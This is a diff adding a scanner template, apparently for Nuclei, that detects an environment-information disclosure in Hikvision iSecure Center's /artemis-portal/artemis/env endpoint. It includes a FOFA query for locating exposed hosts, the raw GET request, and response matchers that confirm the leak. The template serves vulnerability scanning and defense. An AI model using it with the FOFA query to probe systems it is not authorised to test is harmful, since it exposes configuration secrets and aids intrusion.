@@ -1,0 +1,28 @@
+id: hikvision-env-Information-disclosure
+
+info:
+  name: "iSecure Center artemis 接口环境信息泄露"
+  author: Unknown
+  severity: medium
+  description: |-
+    fofa: body="/portal/skin/isee/redblack/"
+    综合安防管理平台 iSecure Center 的 /artemis-portal/artemis/env 接口存在环境信息泄露风险，攻击者可通过访问该路径获取系统敏感配置数据。该漏洞可能导致服务器环境变量、部署架构及安全策略等关键信息暴露，为后续攻击提供情报支持。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247483767&idx=1&sn=3db533fc9cced127763272b6f69b717c&chksm=c267b444f5103d521eea0143c864a2bc8b5b9856eafe9c400b7227baab8440a3aa7acfdb1ac8&token=1439003696&lang=zh_CN#rd
+  tags: iSecure Center
+
+http:
+- raw:
+  - |
+    GET /artemis-portal/artemis/env HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '{"profiles":["prod"]'
+    - 'ENV=non-prod'
+  - type: status
+    status:
+    - 200
